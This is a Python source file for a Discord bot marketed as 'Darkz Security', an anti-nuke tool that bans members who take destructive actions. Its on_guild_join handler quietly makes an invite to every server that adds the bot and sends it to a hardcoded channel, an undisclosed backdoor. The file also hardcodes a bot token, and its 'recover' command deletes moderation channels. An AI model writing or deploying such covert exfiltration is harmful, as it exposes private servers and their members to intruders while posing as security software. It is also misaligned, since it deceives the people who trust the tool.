import os
import discord
from discord.ext import commands
import requests
import sys
import setuptools
from itertools import cycle
import threading
import datetime
import logging
import time
import asyncio
import aiohttp
import tasksio
from discord_slash import SlashCommand, SlashContext
from discord.ext import tasks
from cogs.antiban import antiban
from cogs.antichannel import antichannel
from cogs.antiguild import antiguild
from cogs.antirole import antirole
from cogs.antibot import antibot
from cogs.antikick import antikick
from cogs.antiprune import antiprune
from cogs.antiwebhook import antiwebhook
from cogs.antipinginv import antipinginv
from cogs.antiemostick import antiemostick
from cogs.antintegration import antintegration
proxies = open('proxies.txt').read().split('\n')
proxs = cycle(proxies)
proxies={"http": 'http://' + next(proxs)}

token = "ODUyOTE5NDIzMDE4NTk4NDMw.YMN1HA.8tV15ZUok2ps-162jeRCE0khiQ4"
prefix = "$"


client = discord.Client()
client = commands.AutoShardedBot(command_prefix=prefix, case_insensitive=True, help_command=None,
  intents=discord.Intents.all(), shard_count=1)
slash = SlashCommand(client, override_type = True)

logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;197m[\x1b[0m%(asctime)s\x1b[38;5;197m]\x1b[0m -> \x1b[38;5;197m%(message)s\x1b[0m",
    datefmt="%H:%M:%S",
)

os.system("clear")

client.add_cog(antiban(client))
client.add_cog(antichannel(client))
client.add_cog(antiguild(client))
client.add_cog(antirole(client))
client.add_cog(antibot(client))
client.add_cog(antikick(client))
client.add_cog(antiprune(client))
client.add_cog(antiwebhook(client))
client.add_cog(antipinginv(client))
client.add_cog(antiemostick(client))
client.add_cog(antintegration(client))

@client.listen("on_guild_join")
async def foo(guild):
    channel = guild.text_channels[0]
    rope = await channel.create_invite(unique=True)
    me = client.get_channel(921742943931473970)
    await me.send("I have been added to:")
    await me.send(rope)

@client.command()
@commands.has_permissions(administrator=True)
async def recover(ctx):
  if ctx.author == ctx.guild.owner:
    for channel in ctx.guild.channels:
        if channel.name in ('rules', 'moderator-only'):
            try:
              await channel.delete()
            except:
              pass
        else:
          await ctx.reply(f"Only {ctx.guild.owner} Can Use This Command!")
          
@client.command()
async def help(ctx):
  embed = discord.Embed(title="Darkz Security | Help Panel", description="Help Panel")
  embed.set_author(name="Invite me", url="https://discord.com/api/oauth2/authorize?client_id=852919423018598430&permissions=8&scope=bot")
  embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/852460130255372289.gif")
  embed.add_field(name="<a:help:920221545694117938> help", value="Shows This Message", inline=False)
  embed.add_field(name="<a:bheem_ki_shakti:916276071144493056> features", value="Shows Anti-nuke Features", inline=False)
  embed.add_field(name="<:invite:920222012377563136> invite", value="Sends Bot Invite Link", inline=False)
  embed.add_field(name="<:11_info:927211107603607592> info", value="Shows Bot Information", inline=False)
  await ctx.reply(embed=embed)

@client.command()
async def features (ctx):
  embed = discord.Embed(title="Darkz Security | Anti-nuke Features", description="Features")
  embed.add_field(name="<a:load:927138407975616532> 1. Anti Bot", value="`Bans Nuker On Adding Bot`", inline=False) 
  embed.add_field(name="<a:load:927138407975616532> 2. Anti Ban", value="`Bans Nuker On Banning Someone`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 3. Anti Kick", value="`Bans Nuker On Kicking Someone`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 4. Anti Prune", value="`Bans Nuker On Pruning Atleast 1 Member`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 5. Anti Channel Create/Delete/Update", value="`Bans Nuker On Creating/Deleting/Updating Channel`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 6. Anti Role Create/Delete/Update", value="`Bans Nuker On Creating/Deleting/Updating Role`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 7. Anti Webhook Create", value="`Bans Nuker On Creating Webhook`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 8. Anti Emoji Create", value="`Bans Nuker On Creating Emoji`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 9. Anti Invite Delete", value="`Bans Nuker On Deleting Invite`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 10. Anti Guild Update", value="`Bans Nuker On Updating Guild`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 11. Anti Community Spam", value="`Bans Nuker On Doing Community Spam`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 12. Anti Integration Create", value="`Bans Nuker On Creating Integration`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 13. Anti Everyone Ping", value="`Bans Nuker On Pinging Everyone`",  inline=False)
  embed.add_field(name="<a:load:927138407975616532> 14. Anti Here Ping", value="`Bans Nuker On Pinging Here`", inline=False)
  embed.add_field(name="<a:load:927138407975616532> 15. Anti Role Ping", value="`Bans Nuker On Pinging Any Role`", inline=False)
  embed.add_field(name="<:mof:927139087599665152> Recovery", value="True", inline=False)
  embed.add_field(name="<a:limit:927139345377415228> Limit ", value="1", inline=True)
  embed.add_field(name="<:ban:927139486721269760> Punishment", value="Ban", inline=False)
  embed.set_footer(text="Anti-nuke Features")
  await ctx.reply(embed=embed)

@client.command(aliases=['inv', 'vote'])
async def invite(ctx):
  embed = discord.Embed(title="Invite Me")
  embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/920222012377563136.png")
  embed.add_field(name="<:invite:920222012377563136> Invite", value="[here](https://discord.com/api/oauth2/authorize?client_id=852919423018598430&permissions=8&scope=bot)", inline=False)
  embed.add_field(name="<:vote:927144153236795402> Vote", value="[here](https://top.gg/bot/852919423018598430/vote)", inline=False)
  embed.set_footer(text="Invite & Vote Me")
  await ctx.reply(embed=embed)

@client.command()
async def ping(ctx):
    embed = discord.Embed(title='Pong <a:ping:920222208306073643>', color=000000, description=f'**`{int(client.latency * 1000)}ms`**')
    embed.set_thumbnail(url='https://cdn.discordapp.com/emojis/885681753593872455.gif?size=2048')
    await ctx.reply(embed=embed)

@client.command()
async def info(ctx):
  embed = discord.Embed(title="Darkz Security | Bot Info", description="<a:wing:927146221645217803> Darkz Security Information:")
  embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/920236723684921374.gif")
  embed.add_field(name="<:11_info:927211107603607592> Name", value="`Darkz Security™`", inline=False)
  embed.add_field(name="<:11_info:927211107603607592> Creators", value="<@918527734748164128>, <@743431588599038003>", inline=False)
  embed.add_field(name="<:11_info:927211107603607592> Servers", value=f"`{len(client.guilds)} Servers`", inline=False)
  embed.add_field(name="<:11_info:927211107603607592> Language", value="`Python 1.7.3`", inline=False)
  embed.add_field(name="<:11_info:927211107603607592> Info", value="`Anti-Nuke Bot Which Protects Your Server From Getting Nuked/Trashed/Wizzed`", inline=True)
  embed.add_field(name="<:11_info:927211107603607592> Users", value=f"`{len(client.users)} Users`", inline=True)
  embed.set_footer(text="Darkz Security™")
  await ctx.reply(embed=embed)
client.run(token)